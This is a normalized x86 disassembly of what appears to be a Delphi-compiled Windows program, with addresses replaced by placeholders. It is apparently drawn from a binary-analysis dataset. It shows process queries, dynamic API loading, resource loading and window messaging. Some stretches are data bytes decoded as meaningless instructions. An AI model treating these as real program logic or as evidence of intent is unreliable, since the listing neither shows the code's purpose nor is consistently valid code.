mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c67c
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
test dl dl
jne r-xdata
mov ebx eax
lea ebx [ eax + 0x3 ]
jmp r-xdata
mov eax 0x1
or eax 0xffffffff
jmp r-xdata
test dl dl
jne r-xdata
mov eax [ ebp - 0x4 ]
imul esi
add eax edi
mov [ ebp - 0x4 ] eax
inc [ ebp - 0xc ]
add ebx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
cmp edx 0x4
jl r-xdata
mov cl [ ebx ]
cmp cl [ edx ]
jne r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ rw-data ]
push edx
call sub_4c4e7c
pop ecx
mov esi eax
xor eax eax
mov [ ebp - 0xc ] eax
xor edi edi
xor eax eax
mov edx [ rw-data ]
cmp esi eax
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
inc edx
cmp esi eax
jg r-xdata
mov edi eax
jmp r-xdata
sub_41c700
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x8 ] 0x4
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_4d2618
inc [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
lea edx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] 0xc
lea eax [ ebp + 0x8 ]
call sub_4d2618
inc [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov dl [ rw-data ]
test dl dl
jne r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call sub_41c67c
add esp 0x8
inc eax
mov [ rw-data ] eax
inc [ rw-data ]
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov edx rw-data
jmp r-xdata
mov edx [ ebp + 0x8 ]
movzx eax [ ebx - 0xa ]
cmp eax 0x2
jne r-xdata
push edx
call sub_41c67c
add esp 0x8
mov esi eax
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
xor ecx ecx
mov edx [ ebp + 0xc ]
mov ecx [ edx - 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x8 ]
call j_sub_44a5d8#2
lea edx [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
call sub_41e5d8
xor eax eax
push eax
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
lea eax [ ebp + 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
lea eax [ ebp + 0xc ]
xor edx edx
call sub_4d2728
pop eax
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
cmp ecx 0xe
jne r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov edx rw-data
jmp r-xdata
mov edx [ ebp + 0xc ]
movzx eax [ ebx - 0xa ]
cmp eax 0x2
jne r-xdata
mov ebx edx
push 0x1
push ebx
call sub_41c67c
add esp 0x8
mov edi eax
push 0x0
lea eax [ ebx + 0x5 ]
push eax
call sub_41c67c
add esp 0x8
mov [ ebp - 0x28 ] eax
push 0x1
add ebx 0xa
push ebx
call sub_41c67c
add esp 0x8
mov edx [ ebp - 0x28 ]
xor edx edi
mov ecx edx
xor ecx eax
cmp esi ecx
je r-xdata
cmp esi ecx
jne r-xdata
add eax [ rw-data ]
mov ecx edx
xor ecx eax
lea eax [ ebp + 0xc ]
call j_sub_44a5d8#2
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_41e5d8
mov al 0x1
push eax
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
lea eax [ ebp + 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
lea eax [ ebp + 0xc ]
xor edx edx
call sub_4d2728
pop eax
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c8a8
push ebp
mov ebp esp
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0xc ] 0x11
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_41c900
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
xor eax eax
mov ebx edi
mov [ ebp - 0x4 ] eax
mov eax ebx
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_48df68
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
mov eax [ ecx - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
mov cl 0x1
mov edx edi
mov eax esi
call sub_496e84
cmp eax 0x4
lea eax [ ebp - 0x4 ]
sete dl
and edx 0x1
push edx
mov edx 0x2
dec [ ebp - 0xc ]
call sub_4d318c
pop ecx
test cl cl
je r-xdata
sub_41c980
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
mov esi eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x3c ] 0x18
xor edx edx
mov [ ebp - 0x24 ] edx
lea edx [ ebp - 0x24 ]
inc [ ebp - 0x30 ]
mov eax [ esi + 0x380 ]
call sub_48df68
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
mov [ ebp - 0x14 ] eax
inc [ ebp - 0x30 ]
lea edx [ ebp - 0x14 ]
mov eax [ esi + 0x37c ]
call sub_48df68
lea edx [ ebp - 0x14 ]
xor ecx ecx
push edx
mov [ ebp - 0x8 ] ecx
inc [ ebp - 0x30 ]
lea edx [ ebp - 0x8 ]
mov eax [ esi + 0x378 ]
call sub_48df68
lea ecx [ ebp - 0x8 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x30 ]
xor eax eax
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0xc ]
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x10 ]
pop eax
call sub_4d31c8
lea eax [ ebp - 0x10 ]
xor edx edx
mov [ ebp - 0x18 ] edx
lea ecx [ ebp - 0x18 ]
inc [ ebp - 0x30 ]
pop edx
call sub_4d31c8
lea eax [ ebp - 0x18 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x1c ]
call sub_4d3010
inc [ ebp - 0x30 ]
xor eax eax
mov [ ebp - 0x20 ] eax
lea edx [ ebp - 0x1c ]
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x20 ]
pop eax
call sub_4d31c8
lea eax [ ebp - 0x20 ]
xor edx edx
mov [ ebp - 0x28 ] edx
lea ecx [ ebp - 0x28 ]
inc [ ebp - 0x30 ]
pop edx
call sub_4d31c8
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x30 ]
inc [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x3c ] 0xc
mov ecx [ ebp - 0x4 ]
push ecx
mov eax [ rw-data ]
push eax
call sub_4048a8
add esp 0x8
mov ebx eax
test bl bl
je r-xdata
mov eax [ rw-data ]
push 0x10
mov ecx rw-data
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
mov eax [ rw-data ]
push 0x0
mov ecx rw-data
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
jmp r-xdata
dec [ ebp - 0x30 ]
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x4c ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi + 0x2a4 ] 0x1
mov eax esi
call sub_47dde4
test bl bl
je r-xdata
sub_41cc00
push ebp
mov ebp esp
add esp 0xffffff38
push ebx
push esi
mov eax rw-data
call sub_4c517c
mov [ ebp - 0xc8 ] 0x94
lea edx [ ebp - 0xc8 ]
push edx
call GetVersionExA
mov ecx [ ebp - 0xc0 ]
push ecx
mov eax [ ebp - 0xc4 ]
push eax
push rw-data
push rw-data
call sub_41c354
add esp 0x10
mov edx [ ebp - 0xc4 ]
cmp edx 0x6
jb r-xdata
mov [ ebp - 0x24 ] 0x30
mov edx rw-data
lea eax [ ebp - 0x10 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
inc [ ebp - 0x18 ]
mov edx [ eax ]
push edx
push rw-data
push 0x2b
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
push rw-data
call LoadLibraryA
mov ebx eax
test ebx ebx
jne r-xdata
push rw-data
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
je r-xdata
mov [ ebp - 0x24 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x18 ]
mov edx [ eax ]
push edx
push rw-data
push 0x21
push rw-data
push rw-data
call sub_41c1fc
add esp 0x14
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x34 ]
mov [ fs : 0x0 ] ecx
jmp r-xdata
mov [ ebp - 0x24 ] 0x24
mov edx rw-data
lea eax [ ebp - 0xc ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
inc [ ebp - 0x18 ]
mov edx [ eax ]
push edx
push rw-data
push 0x28
push rw-data
push rw-data
call sub_41c1fc
add esp 0x14
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4d2728
jmp r-xdata
mov [ ebp - 0x24 ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x18 ]
mov edx [ eax ]
push edx
push rw-data
push 0x26
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x34 ]
mov [ fs : 0x0 ] ecx
sub_41cdd0
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
mov [ esi ] 0x0
lea edx [ ebp - 0x38 ]
push edx
push edi
call GetWindowThreadProcessId
mov ecx [ ebp - 0x38 ]
push ecx
push 0x0
push 0x410
call OpenProcess
mov ebx eax
test ebx ebx
je r-xdata
test edi edi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp - 0x34 ]
mov [ fs : 0x0 ] edx
mov [ ebp - 0x24 ] 0x18
xor ecx ecx
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] ecx
push eax
inc [ ebp - 0x18 ]
call sub_41be7c
pop ecx
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x10 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
inc [ ebp - 0x18 ]
mov eax [ edx ]
push eax
push rw-data
push 0x47
push rw-data
push rw-data
call sub_41c1fc
add esp 0x14
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp + 0x10 ]
push ecx
push esi
push 0x0
push ebx
call GetModuleFileNameExA
mov esi eax
mov edx [ ebp + 0x10 ]
push edx
push esi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
push ebx
call CloseHandle
test esi esi
setg al
and eax 0x1
mov edx [ ebp - 0x34 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov [ ebp - 0x24 ] 0xc
xor eax eax
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
push edx
inc [ ebp - 0x18 ]
call sub_41be7c
pop ecx
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x18 ]
mov edx [ eax ]
push edx
push rw-data
push 0x42
push rw-data
push rw-data
call sub_41c1fc
add esp 0x14
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
test esi esi
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cf8c
push ebx
mov ebx eax
mov eax ebx
call sub_41cf80
test al al
jne r-xdata
mov eax ebx
call sub_41d080
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
or bx 0x20
cmp bx 0x61
jb r-xdata
movzx eax bl
movzx eax [ eax + rw-data ]
call sub_41cf64
jmp r-xdata
movzx eax bx
mov edx eax
shr edx 0x8
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
mov ecx eax
shr ecx 0x4
and ecx 0xf
add edx ecx
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
and eax 0xf
add edx eax
mov eax [ rw-data ]
movzx eax [ eax + edx ]
call sub_41cf64
pop ebx
retn
call sub_41d0ec
xor eax eax
jmp r-xdata
cmp bx 0x7a
jbe r-xdata
pop ebx
retn
mov al 0x1
sub_41d018
push ebx
mov ebx eax
mov eax ebx
call sub_41cf80
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax bl
movzx eax [ eax + rw-data ]
call sub_41cf70
pop ebx
retn
movzx eax bx
mov edx eax
shr edx 0x8
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
mov ecx eax
shr ecx 0x4
and ecx 0xf
add edx ecx
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
and eax 0xf
add edx eax
mov eax [ rw-data ]
movzx eax [ eax + edx ]
call sub_41cf70
pop ebx
retn
call sub_41d0ec
sub_41d08c
push ebx
mov ebx eax
mov eax ebx
call sub_41cf80
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax bl
movzx eax [ eax + rw-data ]
pop ebx
retn
movzx eax bx
mov edx eax
shr edx 0x8
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
mov ecx eax
shr ecx 0x4
and ecx 0xf
add edx ecx
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
and eax 0xf
add edx eax
mov eax [ rw-data ]
movzx eax [ eax + edx ]
pop ebx
retn
call sub_41d0ec
sub_41d0ec
push ebx
push esi
mov esi rw-data
push 0xa
push r-xdata
mov eax [ rw-data ]
push eax
call FindResourceW
mov ebx eax
test ebx ebx
jne r-xdata
push ebx
mov eax [ rw-data ]
push eax
call LoadResource
mov ebx eax
test ebx ebx
jne r-xdata
call sub_43ba38
push ebx
call LockResource
mov [ esi ] eax
cmp [ esi ] 0x0
jne r-xdata
call sub_43ba38
mov eax [ esi ]
mov edx [ esi ]
mov ecx edx
add ecx [ eax ]
mov [ rw-data ] ecx
mov ecx edx
add ecx [ eax + 0x4 ]
mov [ rw-data ] ecx
mov ecx edx
add ecx [ eax + 0x8 ]
mov [ rw-data ] ecx
mov ecx edx
add ecx [ eax + 0xc ]
mov [ rw-data ] ecx
mov ecx edx
add ecx [ eax + 0x10 ]
mov [ rw-data ] ecx
add edx [ eax + 0x14 ]
mov [ rw-data ] edx
pop esi
pop ebx
retn
call sub_43ba38
sub_41d17f
add [ ebx ] al
dec eax
add [ ecx ] al
push edx
add [ eax + eax + 0x41 ] dl
add [ edx ] al
dec esp
add [ ebp ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41d1b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1c0
retn
sub_41d1cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41d1f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1f8
retn
sub_41d204
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41d229
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d230
retn
sub_41d23c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41d261
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d268
retn
sub_41d286
call [ eax + r-xdata ]
add eax [ edx ]
cmp dh [ ecx ]
add eax 0x0
or al 0x0
add [ eax ] al
mov dl dl
inc ecx
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
mov eax ebx
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
lea eax [ ebp - 0x4 ]
push ebx
push esi
call GetProcAddress
add [ edi + edi * 8 + 0x30 ] ah
jb r-xdata
jb r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3d6
lea eax [ ebp - 0x4 ]
call sub_449348
retn
mov ebx eax
jmp r-xdata
or eax [ eax ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
mov eax [ ebp - 0x4 ]
ja r-xdata
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
mov [ fs : eax ] esp
push ebx
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
mov edx ebx
mov ecx 0x0
call sub_4495c0
je r-xdata
pop ebp
or al 0x8b
jne r-xdata
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae r-xdata
imul esp [ edi + 0x68 ] 0x646f0a74
call sub_449890
cld
nop
cmp al 0xd3
inc ecx
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
loopne r-xdata
je r-xdata
push [ fs : eax ]
xor eax eax
push ebp
push sub_41d3cf
shr eax 0x10
jne r-xdata
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push eax
push esi
add al [ eax ]
call GetProcAddress
mov ebx eax
add ecx [ eax - 0x6fffbe2e ]
nop
sub_41d354
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push ebx
call InterlockedCompareExchange
pop edi
pop esi
pop ebx
retn
sub_41d36c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41d3cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
shr eax 0x10
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx ebx
mov ecx 0x0
call sub_4495c0
mov eax [ ebp - 0x4 ]
call sub_449890
push eax
push esi
call GetProcAddress
mov ebx eax
push ebx
push esi
call GetProcAddress
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3d6
lea eax [ ebp - 0x4 ]
call sub_449348
retn
sub_41d3e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_447958
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExW
mov esi eax
mov eax ebx
call sub_447948
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_41d438
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowW
mov ebx eax
push r-xdata
call RegisterWindowMessageW
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageW
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageW
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageW
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageW
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_41d5d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41d5fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d604
retn
sub_41d610
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x18
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_41d6cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
xor ebx ebx
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_41d76c
push ebx
push esi
push edi
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_41d7e8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov ebp 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push ebx
push edi
push esi
call [ rw-data ]
mov ebp eax
jmp r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push ebx
push edi
push esi
call [ rw-data ]
mov ebp eax
sub_41d874
push ebp
mov ebp esp
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor edx edx
push ebp
push sub_41da2a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da31
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
